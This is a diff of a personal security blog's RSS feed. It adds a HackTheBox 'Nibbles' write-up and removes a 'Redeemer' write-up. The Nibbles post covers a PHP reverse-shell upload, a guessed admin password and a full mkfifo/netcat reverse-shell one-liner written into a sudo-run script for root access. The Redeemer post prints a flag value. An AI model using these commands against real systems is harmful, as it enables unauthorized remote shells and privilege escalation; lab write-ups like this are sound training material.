@@ -8,8 +8,105 @@
     <language>en</language>
     <managingEditor>leewookb@gmail.com (Wook Lee)</managingEditor>
     <webMaster>leewookb@gmail.com (Wook Lee)</webMaster>
-    <lastBuildDate>Wed, 07 Aug 2024 00:00:00 +0000</lastBuildDate>
+    <lastBuildDate>Thu, 08 Aug 2024 00:00:00 +0000</lastBuildDate>
     <atom:link href="http://localhost:1313/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>[HTB] Nibbles</title>
+      <link>http://localhost:1313/htb-nibbles/</link>
+      <pubDate>Thu, 08 Aug 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
+      <guid>http://localhost:1313/htb-nibbles/</guid>
+      <description>enumeration using nmap scan from the output of nmap scan I learned there were 2 open ports and the one I had to look into was the port 80. Navigated to the target address on firefox but the website didn&amp;rsquo;t have any juicy info except the plain text saying Hello world!. right clicked on the web page and viewed the source code without any expectation but there was this interesting comment.</description>
+      <content:encoded><![CDATA[<h4 id="enumeration-using-nmap-scan">enumeration using nmap scan</h4>
+<p>from the output of nmap scan I learned there were 2 open ports and the one I had to look into was the port 80.
+<img src="image-29.png#center" alt="alt text"></p>
+<br>
+<p>Navigated to the target address on firefox but the website didn&rsquo;t have any juicy info except the plain text saying <strong><em>Hello world!</em></strong>.
+<img src="image-30.png#center" alt="alt text"></p>
+<br>
+<p>right clicked on the web page and <strong><em>viewed the source code</em></strong> without any expectation but there was this interesting comment.
+<img src="image-31.png#center" alt="alt text"></p>
+<br>
+<p>navigated to the <strong><em>/nibbleblog</em></strong> as the comment hinted
+<img src="image-32.png#center" alt="alt text"></p>
+<br>
+<h4 id="more-information-gathering-with-_gobuster_">more information gathering with <strong><em>gobuster</em></strong></h4>
+<p>while on the <strong><em>/nibbleblog</em></strong> web page, I could not find more useful info so I decided to run a <strong><em>gobuster</em></strong> on the website to gather more information.
+<img src="image-33.png#center" alt="alt text"></p>
+<br>
+<p>The gobuster output showed many directories but the results were not satisfying. I knew there had to be more. So I ran another <strong><em>gobuster</em></strong> scan but this time I added the <strong>-x</strong> option to search for specific file extensions.</p>
+<p>The <strong><em>/admin.php</em></strong> was the first result that caught my eye.</p>
+<p><img src="image-34.png#center" alt="alt text"></p>
+<br>
+<p><strong><em>/nibbleblog/admin.php</em></strong></p>
+<p><img src="image-35.png#center" alt="alt text"></p>
+<br>
+<p>I didn&rsquo;t have anything for the admin credentials until I found this <strong><em>user.xml</em></strong> file that&rsquo;s located in the following path:
+<strong><em>/nibbleblog/content/private/users.xml</em></strong>
+<img src="image-36.png#center" alt="alt text"></p>
+<br>
+<p>The title of the nibbleblog was <strong><em>nibbles</em></strong> so why not try that for the password? and it turned out that it was the password. I was skeptical of doing the guesswork for the password but later I refered to other people&rsquo;s write ups but all of them also did some guessworks to figure out the password. I guess it&rsquo;s an important part of the pentesting.</p>
+<p><img src="image-37.png#center" alt="alt text"></p>
+<br>
+<p>a screenshot of the admin dashboard page
+<img src="image-38.png#center" alt="alt text"></p>
+<br>
+<p>Under the <strong>/plugins</strong> directory, there was this <strong><em>my image</em></strong> page where I could upload a file to the server and I definitely knew I could use this for uploading a reverse shell payload as an exploitation.</p>
+<p><img src="image-39.png#center" alt="alt text"></p>
+<br>
+<p>For the reverse shell payload, I downloaded the popular <strong><em>pentestmonkey</em></strong>&rsquo;s php-reverse-shell.
+<img src="image-40.png#center" alt="alt text"></p>
+<br>
+<p><img src="image-41.png#center" alt="alt text"></p>
+<br>
+<p>After uploading the payload file I had to manually navigate to the following path to run it on the server.</p>
+<p><strong><em>/nibbleblog/content/private/plugins/my_image</em></strong>
+<img src="image-1.png#center" alt="alt text"></p>
+<br>
+<p><strong><em>netcat listener</em></strong> successfully captured the reverse shell.
+<img src="image-2.png#center" alt="alt text"></p>
+<br>
+<p>got the user flag!</p>
+<p>oh I almost forgot. As you could notice from the screenshot below, I upgraded the shell to the <strong><em>fully interactive TTY Shell</em></strong>.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span><span style="color:#6c7086;font-style:italic">#reverse shell</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>python3 -c <span style="color:#a6e3a1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>ctrl + z <span style="color:#6c7086;font-style:italic"># background</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span><span style="color:#6c7086;font-style:italic">#kali</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>stty raw -echo; <span style="color:#89dceb">fg</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>reset
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#6c7086;font-style:italic">#reverse shell</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span><span style="color:#89dceb">export</span> <span style="color:#f5e0dc">SHELL</span><span style="color:#89dceb;font-weight:bold">=</span>bash
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span><span style="color:#89dceb">export</span> <span style="color:#f5e0dc">TERM</span><span style="color:#89dceb;font-weight:bold">=</span>xterm-256color</span></span></code></pre></div>
+<hr>
+<p><img src="image-3.png#center" alt="alt text"></p>
+<br>
+<p><strong><em>privilege escalation</em></strong></p>
+<p>With the reverse shell, the current user, <strong>nibbler</strong> was not able to access the root directory. So I had to figure a way for privilege escalation. I ran the <code>sudo -l</code> command to list the commands I can actually run with the <strong>sudo</strong> and I could run the following</p>
+<p><code>/home/nibbler/personal/stuff/monitor.sh</code></p>
+<p><img src="image-4.png#center" alt="alt text"></p>
+<br>
+<p>This is the part where I needed some help. I couldn&rsquo;t figure out what it took me to write inside the <strong>monitor.sh</strong> file for privilege escalation so I refered to one of the walkthroughs online.</p>
+<p><code>echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 10.10.14.15 1235 &gt;/tmp/f' &gt; /home/nibbler/personal/stuff/monitor.sh</code></p>
+<br>
+<p>After modifying the content inside the file, I pop opened another netcat listener with another port, 1235 because the port 1234 was already listening for the original reverse shell.</p>
+<p><code>sudo /home/nibbler/personal/stuff/monitor.sh</code></p>
+<br>
+<p><strong>id</strong> command returned that I&rsquo;m the root user
+<img src="image-5.png#center" alt="alt text"></p>
+<br>
+<p>successfully got the root flag
+<img src="image-6.png#center" alt="alt text"></p>
+<br>
+<p><img src="image-7.png#center" alt="alt text"></p>
+]]></content:encoded>
+    </item>
     <item>
       <title>[HTB] Devel</title>
       <link>http://localhost:1313/htb-devel/</link>
@@ -8879,246 +8976,6 @@ To simply put, a port is like an address for a specific program or service runni
 </ul>
 <hr>
 <p>Now it all makes sense. When we are doing a CTF, the first thing we always do in the enumeration phase is utilize the <code>nmap</code> command to perform port scanning. This helps us identify open ports and see which services are running on them. The target might be running several programs, and we need to find and confirm which programs/services are running and identify corresponding vulnerabilities.</p>
-]]></content:encoded>
-    </item>
-    <item>
-      <title>[HTB] Redeemer</title>
-      <link>http://localhost:1313/htb-redeemer/</link>
-      <pubDate>Tue, 18 Jun 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
-      <guid>http://localhost:1313/htb-redeemer/</guid>
-      <description>some thoughts:
-This box was the most challenging one to crack so far, but I feel incredibly accomplished seeing my progress. I really enjoy writing about my experiences in this personal space, even though no one else is seeing it. I&amp;rsquo;m practicing not to rely on external sources unless I&amp;rsquo;ve tried everything I can on my own, and I&amp;rsquo;m really glad I&amp;rsquo;ve decided to do so. Working on this box has made me feel like I&amp;rsquo;m going to remember every step I took to get the flag.</description>
-      <content:encoded><![CDATA[<p>some thoughts:</p>
-<p>This box was the most challenging one to crack so far, but I feel incredibly accomplished seeing my progress. I really enjoy writing about my experiences in this personal space, even though no one else is seeing it. I&rsquo;m practicing not to rely on external sources unless I&rsquo;ve tried everything I can on my own, and I&rsquo;m really glad I&rsquo;ve decided to do so. Working on this box has made me feel like I&rsquo;m going to remember every step I took to get the flag.</p>
-<div style="text-align: center"><img src="./kermitthefrog-dance.gif" alt="frog_dancing"></div>
-<hr>
-<h5 id="task-1">TASK 1</h5>
-<p>Which TCP port is open on the machine?</p>
-
-
-
-
-
-
-<pre tabindex="0"><code>6379</code></pre>
-
-
-
-
-
-
-<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌─<span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>10.10.14.27<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-iwwc2qnr0i<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>~<span style="color:#89dceb;font-weight:bold">]</span>
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└──╼ <span style="color:#89dceb;font-weight:bold">[</span>★<span style="color:#89dceb;font-weight:bold">]</span>$ nmap -sC -sV 10.129.136.187
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Starting Nmap 7.93 <span style="color:#89dceb;font-weight:bold">(</span> https://nmap.org <span style="color:#89dceb;font-weight:bold">)</span> at 2024-06-18 04:24 BST
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Nmap scan report <span style="color:#cba6f7">for</span> 10.129.136.187
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Host is up <span style="color:#89dceb;font-weight:bold">(</span>0.027s latency<span style="color:#89dceb;font-weight:bold">)</span>.
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>All <span style="color:#fab387">1000</span> scanned ports on 10.129.136.187 are in ignored states.
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>Not shown: <span style="color:#fab387">1000</span> closed tcp ports <span style="color:#89dceb;font-weight:bold">(</span>conn-refused<span style="color:#89dceb;font-weight:bold">)</span>
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>Nmap <span style="color:#cba6f7">done</span>: <span style="color:#fab387">1</span> IP address <span style="color:#89dceb;font-weight:bold">(</span><span style="color:#fab387">1</span> host up<span style="color:#89dceb;font-weight:bold">)</span> scanned in 0.71 seconds</span></span></code></pre></div>
-<p>Initially, scanning ports on the target IP address did not reveal any open ports. Therefore, I had to expand my scan to include more ports. By default, Nmap scans only the most commonly used 1,000 ports, which are statistically the most likely to be open based on real-world usage. By adding the <code>-p-</code> option, Nmap scans all 65,535 ports on the target IP address. This extended scan revealed that port 6379/tcp is open.</p>
-
-
-
-
-
-
-<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌─<span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>10.10.14.27<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-iwwc2qnr0i<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>~<span style="color:#89dceb;font-weight:bold">]</span>
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└──╼ <span style="color:#89dceb;font-weight:bold">[</span>★<span style="color:#89dceb;font-weight:bold">]</span>$ nmap -sV -T4 10.129.136.187 -p-
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Starting Nmap 7.93 <span style="color:#89dceb;font-weight:bold">(</span> https://nmap.org <span style="color:#89dceb;font-weight:bold">)</span> at 2024-06-18 04:25 BST
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Nmap scan report <span style="color:#cba6f7">for</span> 10.129.136.187
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Host is up <span style="color:#89dceb;font-weight:bold">(</span>0.068s latency<span style="color:#89dceb;font-weight:bold">)</span>.
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>Not shown: <span style="color:#fab387">65534</span> closed tcp ports <span style="color:#89dceb;font-weight:bold">(</span>conn-refused<span style="color:#89dceb;font-weight:bold">)</span>
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>PORT STATE SERVICE VERSION
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>6379/tcp open redis Redis key-value store 5.0.7
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>Nmap <span style="color:#cba6f7">done</span>: <span style="color:#fab387">1</span> IP address <span style="color:#89dceb;font-weight:bold">(</span><span style="color:#fab387">1</span> host up<span style="color:#89dceb;font-weight:bold">)</span> scanned in 37.48 seconds</span></span></code></pre></div>
-<br/>
-<h5 id="task-2">TASK 2</h5>
-<p>which service is running on the port that is open on the machine?</p>
-
-
-
-
-
-
-<pre tabindex="0"><code>redis</code></pre>
-<br/>
-<h5 id="task-3">TASK 3</h5>
-<p>what type of database is Redis? Choose from the following options:</p>
-<p>(i) In-memory Database, (ii) Traditional Database</p>
-
-
-
-
-
-
-<pre tabindex="0"><code>In-memory Database</code></pre>
-<p>Redis is known for its high performance. Storing data in memory allows Redis to achieve extremely low latency and high throughput compared to disk-based databases. It&rsquo;s commonly used as cache to speed up application performance by temporarily storing frequently accessed data.</p>
-<br/>
-<h5 id="task-4">TASK 4</h5>
-<p>which command-line is used to interact with the Redis server? Enter the program name you would enter into the terminal without any arguments.</p>
-
-
-
-
-
-
-<pre tabindex="0"><code>redis-cli</code></pre>
-<p>To be able to interact with the Redis server, we need to download the <code>redis-cli</code> utility. It can be downloaded using the command below.</p>
-<p><code>sudo apt install redis-tools</code></p>
-<br/>
-<h5 id="task-5">TASK 5</h5>
-<p>which flag is used with the Redis command-line utility to specify the hostname?</p>
-
-
-
-
-
-
-<pre tabindex="0"><code>-h</code></pre>
-
-
-
-
-
-
-<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>┌─<span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>10.10.14.27<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-iwwc2qnr0i<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>~<span style="color:#89dceb;font-weight:bold">]</span>
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>└──╼ <span style="color:#89dceb;font-weight:bold">[</span>★<span style="color:#89dceb;font-weight:bold">]</span>$ redis-cli --help
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>redis-cli 7.0.10
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>Usage: redis-cli <span style="color:#89dceb;font-weight:bold">[</span>OPTIONS<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">[</span>cmd <span style="color:#89dceb;font-weight:bold">[</span>arg <span style="color:#89dceb;font-weight:bold">[</span>arg ...<span style="color:#89dceb;font-weight:bold">]]]</span>
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>-h &lt;hostname&gt; Server hostname <span style="color:#89dceb;font-weight:bold">(</span>default: 127.0.0.1<span style="color:#89dceb;font-weight:bold">)</span>.</span></span></code></pre></div>
-<br/>
-<h5 id="task-6">TASK 6</h5>
-<p>Once connected to a Redis server, which command is used to obtain the information and statistics about the Redis server?</p>
-
-
-
-
-
-
-<pre tabindex="0"><code>info</code></pre>
-<p>The answer to this question was a bit challenging to find. A quick Google search would have provided it in seconds, but I wanted to challenge my self. After I got a successful connection with the Redis server, I typed the <code>help</code> command to gain some insights.</p>
-
-
-
-
-
-
-<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>10.129.136.187:6379&gt; <span style="color:#89dceb">help</span>
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>redis-cli 7.0.10
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>To get <span style="color:#89dceb">help</span> about Redis commands type:
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span><span style="color:#a6e3a1">&#34;help @&lt;group&gt;&#34;</span> to get a list of commands in &lt;group&gt;
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span><span style="color:#a6e3a1">&#34;help &lt;command&gt;&#34;</span> <span style="color:#cba6f7">for</span> <span style="color:#89dceb">help</span> on &lt;command&gt;
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span><span style="color:#a6e3a1">&#34;help &lt;tab&gt;&#34;</span> to get a list of possible <span style="color:#89dceb">help</span> topics
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">7</span><span><span style="color:#a6e3a1">&#34;quit&#34;</span> to exit</span></span></code></pre></div>
-<p>The output indicated that <code>help &lt;tab&gt;</code> command would list possible help topics. Each time I pressed the tab key, the topic changed. Then I found <code>@server</code> topic, which seemed promising since I was looking for a command to obtain the information and statistics about the Redis server.</p>
-
-
-
-
-
-
-<pre tabindex="0"><code>10.129.136.187:6379&gt; help @server</code></pre>
-<p>As I scrolled through the output of the command, I found the answer I was looking for.</p>
-<div style="text-align: center"><img src="./image1.png"></div>
-<br/>
-<h5 id="task-7">TASK 7</h5>
-<p>What is the version of the Redis server being used on the target machine?</p>
-
-
-
-
-
-
-<pre tabindex="0"><code>5.0.7</code></pre>
-
-
-
-
-
-
-<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>10.129.136.187:6379&gt; info
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span><span style="color:#6c7086;font-style:italic"># Server</span>
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>redis_version:5.0.7
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>redis_git_sha1:00000000
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>redis_git_dirty:0</span></span></code></pre></div>
-<br/>
-<h5 id="task-8">TASK 8</h5>
-<p>Which command is used to select the desired database in Redis?</p>
-
-
-
-
-
-
-<pre tabindex="0"><code>select</code></pre>
-<div style="text-align: center"><img src="./image2.png"></div>
-<br/>
-<h5 id="task-9">TASK 9</h5>
-<p>How many keys are present inside the database with index 0?</p>
-
-
-
-
-
-
-<pre tabindex="0"><code>4</code></pre>
-
-
-
-
-
-
-<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>10.129.136.187:6379&gt; dbsize
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span><span style="color:#89dceb;font-weight:bold">(</span>integer<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#fab387">4</span>
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>10.129.136.187:6379&gt;</span></span></code></pre></div>
-<br />
-<h5 id="task-10">TASK 10</h5>
-<p>Which command is used to obtain all the keys in a database?</p>
-
-
-
-
-
-
-<pre tabindex="0"><code>keys *</code></pre>
-<div style="text-align: center"><img src="./image4.png"></div>
-
-
-
-
-
-
-<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>10.129.136.187:6379&gt; keys *
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>1. <span style="color:#a6e3a1">&#34;temp&#34;</span>
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>2. <span style="color:#a6e3a1">&#34;numb&#34;</span>
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>3. <span style="color:#a6e3a1">&#34;flag&#34;</span>
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>4. <span style="color:#a6e3a1">&#34;stor&#34;</span>
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>   10.129.136.187:6379&gt;</span></span></code></pre></div>
-<br/>
-<h5 id="submit-flag">SUBMIT FLAG</h5>
-<p>submit root flag</p>
-
-
-
-
-
-
-<pre tabindex="0"><code>03e1d2b376c37ab3f5319922053953eb</code></pre>
-<div style="text-align: center"><img src="./image5.png"></div>
-
-
-
-
-
-
-<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>10.129.136.187:6379&gt; get flag
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span><span style="color:#a6e3a1">&#34;03e1d2b376c37ab3f5319922053953eb&#34;</span>
-</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>10.129.136.187:6379&gt;</span></span></code></pre></div>
 ]]></content:encoded>
     </item>
   </channel>
